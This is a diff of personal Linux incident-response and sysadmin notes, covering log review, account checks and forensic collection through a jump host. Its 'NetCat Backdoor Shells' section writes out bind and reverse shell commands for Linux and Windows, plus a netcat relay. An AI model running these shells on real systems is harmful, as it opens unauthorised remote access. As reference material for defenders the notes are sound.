@@ -6,7 +6,9 @@ Notes last updated: 4.10.2024
 ``` 
 ip addr show
 ```
-
+```
+ip route show
+```
 show all ip info 
 ```
 ip a
@@ -161,7 +163,11 @@ Info: Look for cron jobs scheduled as root or any other UID 0 accoutns
 ```
 crontab –u root –l
 ```
-
+Info: Look for unusual system wide cron jobs    
+```
+cat /etc/crontab
+ls /etc/cron.*
+```
 
 # LIST INSTALLED APPS   
 List apps installed via snap 
@@ -183,7 +189,14 @@ grep " install " /var/log/dpkg.log
 ```
 sudo dpkg --get-selections | grep -v deinstall
 ```
-
+```
+dpkg --get-selections 
+grep install /var/log/dpkg.log /var/log/dpkg.log.1
+```
+```
+ls -AlF /var/lib/dpkg/info/
+ll /var/lib/dpkg/info/ | grep -i '.list'
+```
 
 # Searching Finding & Sorting
 Search for patterns in each file: 
@@ -244,7 +257,10 @@ find / -name " " –print
 find / -name “ “ –print
 find / -regex '.+[^A-Za-z0-9(+=_-/.,!@#$%^&*~:;)]' -print
 ``` 
-
+List Symbolic LInks in a dir 
+```
+find . -maxdepth 1 -type l -ls
+```
 
 # LIST MOUNTED FILES, DRIVES, Block Devices
 List all mounted files and drives 
@@ -453,9 +469,9 @@ cat /etc/passwd | sort -nk3 -t:
    
 Info: Find any unexpected UID 0 accounts (root)
 ```
-Command: getent passwd | egrep ':0+:'
-Command: egrep ':0+:' /etc/passwd
-Command: grep :0: /etc/passwd
+getent passwd | egrep ':0+:'
+egrep ':0+:' /etc/passwd
+grep :0: /etc/passwd
 ```   
 
 get cpu temps - sudo apt install lm-sensors -y && sudo sensors-detect 
@@ -463,8 +479,7 @@ get cpu temps - sudo apt install lm-sensors -y && sudo sensors-detect
 sensors
 ```
 
-# not sure... 
-   
+# not sure...  
 ```
 nmcli device show <interFaceName> | grep IP4.DNS
 ```
@@ -475,11 +490,6 @@ Info: Look for excesive Memory use
 free
 ```
    
-Info: Look for unusual system wide cron jobs    
-```
-cat /etc/crontab
-ls /etc/cron.*
-```
 
 Info: List last login for each user 
 ```
@@ -489,11 +499,13 @@ lastlog
 Info: user logins and system reboots. File may be truncated weekly or monthly
 Look for rolled logs too (ll /var/log/ | grep -i wtmp).
 ```
+last
 last -f /var/log/wtmp
 ```
    
 Info: Failed Logins. May not be kept due to risk of password disclosure. 
 ```
+lastb 
 lastb -f /var/log/btmp | less
 ```
 
@@ -503,11 +515,11 @@ Link: https://serverfault.com/questions/130482/how-to-check-sshd-log
 grep 'sshd' /var/log/auth.log
 tail -n 500 /var/log/auth.log | grep 'sshd'   (last 500 logs)
 tail -f -n 500 /var/log/auth.log | grep 'sshd'   (live view)
- ```
-
-Info: Find users that have been added to they system 
 ```
-ausearch -if /path/to/evidence/var/log/audit.log -c useradd
+
+Info: Find users that have been added to the system 
+```
+sudo ausearch -if /var/log/audit/audit.log -c useradd
 ```
    
 Info: Split large CSV file into many with 999 rows, and keep the headers. 
@@ -522,8 +534,6 @@ split -d -l 10000 file_name.csv file_part_
 file_name = Name of the file you want to split.
 10000 = Number of rows each split file would contain
 file_part_ = Prefix of split file name (file_part_0,file_part_1,file_part_2..etc goes on)
-
-
 
 
 #Display enviroment variables 
@@ -566,40 +576,7 @@ info: list last logged in users
 w
 ```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-   
-
-
-SORT
-===-
-uname -a
-cat /etc/fstab
-flatpack list
-#users 
-cat /etc/passwd
-
-# Show host information  
+# Show host file
 ```
 cat /etc/hosts
 ```
@@ -609,19 +586,26 @@ cat /etc/hosts
 sudo dd if=./ubuntu-18.04.4-desktop-amd64.iso of=/dev/sdc
 ```
 
+
 ls -AlF /var/lib/dpkg/info/
 ll /var/lib/dpkg/info/ | grep -i '.list'
 
-dpkg --get-selections 
-grep install /var/log/dpkg.log /var/log/dpkg.log.1
+
 pgrep
-ip route show
+
   313  ip route get ipaddress
   314  ip route show
 
 iftop
 
+# Check for updates
+```
+sudo apt update && sudo apt upgrade -y && sudo snap refresh
+```
+```
 update-manager -d
+```
+
 
 
 # NetCat Commands
@@ -694,21 +678,21 @@ Add –p [port] to specify a source port for the
 
 # NetCat Backdoor Shells
 ===============-
-Listening backdoor shell on Linux:
+* Listening backdoor shell on Linux:
 ```
 $ nc –l –p [LocalPort] –e /bin/bash
 ```
-Listening backdoor shell on Windows:
+* Listening backdoor shell on Windows:
 ```   
 C:\> nc –l –p [LocalPort] –e cmd.exe
 ```
 
 Create a shell on local port [LocalPort] that can then be accessed using a fundamental Netcat client
-# NetCt Reverse backdoor shell on Linux:
+* NetCt Reverse backdoor shell on Linux:
 ```
 $ nc [YourIPaddr] [port] –e /bin/bash
 ```
-Reverse backdoor shell on Windows:
+* Reverse backdoor shell on Windows:
 ```
 C:\> nc [YourIPaddr] [port] –e cmd.exe
 ```
@@ -716,8 +700,7 @@ Create a reverse shell that will attempt to connect to
 [YourIPaddr] on local port [port]. This shell
 can then be captured using a fundamental nc listener
 
-#Netcat Relays on Linux
-=====================--
+* Netcat Relays on Linux
 To start, create a FIFO (named pipe) called backpipe:
 ```
    $ cd /tmp
@@ -748,14 +731,6 @@ Create a relay that sends packets from the connection to [PreviousHopIPaddr] on 
 
 # BRO 
 
-
-
-List Symbolic LInks in a dir 
-```
-find . -maxdepth 1 -type l -ls
-```
-
-
 # Remnux - VMWare make share folder available (run on guest)
 ### https://askubuntu.com/questions/29284/how-do-i-mount-shared-folders-in-ubuntu-using-vmware-tools
 ```
@@ -765,50 +740,41 @@ find . -maxdepth 1 -type l -ls
 
 
 # Run Commands through a Jump host
-
 -- DNS LOGS -- 
 ```
 ssh pivotgw ssh {serverip} sudo zgrep query /var/log/dnsmasq.* > ~/Documents/DNS_queries.txt 
 ssh pivotgw ssh 10.40.48.254 sudo zgrep query /var/log/dnsmasq.*  | cut -d ':' -f5 | cut -d ' ' -f3 | sort | uniq -c | sort -nr > ~/Documents/DNS_Logs_Stacked.txt
 ssh pivotgw ssh 10.40.48.254 sudo zgrep query /var/log/dnsmasq.* | grep -i -E "chatvisor|screenconnect|teamview|anydesk|example.com" | sort > ~/Documents/DomainLookup_report.txt
 ```
-
 -- NETWORK CONNECTIONS -- 
 ```
 ssh pivotgw ssh {serverip} sudo lsof -i | grep ESTABLISHED > ~/Documents/lsof_i.log
 ssh pivotgw ssh {serverip} sudo lsof -i -n -P
 ssh pivotgw ssh {serverip} sudo netstat -apnvtu | grep -i estab
-```
-	 
+```	 
 -- HOST FILE -- 
 ```
 ssh pivotgw ssh {serverip} cat /etc/hosts
 ```
-
 -- RUNNING PROCESSES -- 
 ```
 ssh pivotgw ssh {serverip} sudo ps aux
 ```
-
 -- BASH HISTORY FOR ALL USERS (not through Jump Host) -- 
 ```
 sudo su
 getent passwd | cut -d : -f 6 | sed 's:$:/.bash_history:' | xargs -d '\n' grep -s -H -e "$pattern"
 ```
- 
 -- LIST USERS -- 
 ```
 ssh pivotgw ssh {serverip}  cat /etc/passwd | grep -v "nologin" | grep -v "false"| grep -v "sync"
 ssh pivotgw ssh {serverip} w
 ```
-
 -- MOST RECENT LOGINS -- 
 ```
 ssh pivotgw ssh {serverip} last
-```
-	
+```	
 -- List init* & rc.d -- 
-inittab: 
 ```
 ssh pivotgw ssh {serverip} sudo ls -la /etc/inittab
 init.d: ssh pivotgw ssh {serverip} sudo ls -la /etc/init.d
@@ -816,7 +782,6 @@ rc.d: ssh pivotgw ssh {serverip} sudo ls -la /etc/rc.d
 init.conf: ssh pivotgw ssh {serverip} sudo ls -la /etc/init.conf
 init: ssh pivotgw ssh {serverip} sudo ls -la /etc/init
 ```
-
 -- AUTH LOGS -- 
 ```
 ssh pivotgw ssh {serverip} sudo cat /var/log/auth.log
@@ -825,15 +790,13 @@ ssh pivotgw ssh {serverip} sudo cat /var/log/auth.log | grep -i Accepted | cut -
 ssh pivotgw ssh {serverip} sudo cat /var/log/auth.log | grep -i Accepted | cut -d ':' -f4 | cut -d' ' -f5,7 | sort | uniq -c | sort -nr
 ssh pivotgw ssh {serverip} sudo cat /var/log/auth.log | grep -E 'sshd.*Failed|Invalid|failure'
 ```
-
 -- List the top 25 largest files on the server -- 
 ```
 ssh pivotgw ssh {serverip} sudo find /home -printf '%s\\\ %p\\\\n'| sort -nr | head -25
 ```
-
 -- rsync files from server to local host: 
 
--On the server:
+* On the server:
 ```
 sudo su
 cp /file/location/filename /home/{yourUsername}/
@@ -842,7 +805,7 @@ chown {yourUsername} {filename}
 ```
 If dealing with multiple files or a directory, zip the contents of the directory first. Then rsync it to your system. 
 
--On Client (workstation) : 
+* On Client (workstation) : 
 ```
 rsync -v -r -e "ssh pivotgw ssh" {serverip}:/home/{yourUserName}/{FileName} ~/temp/IR
 ```
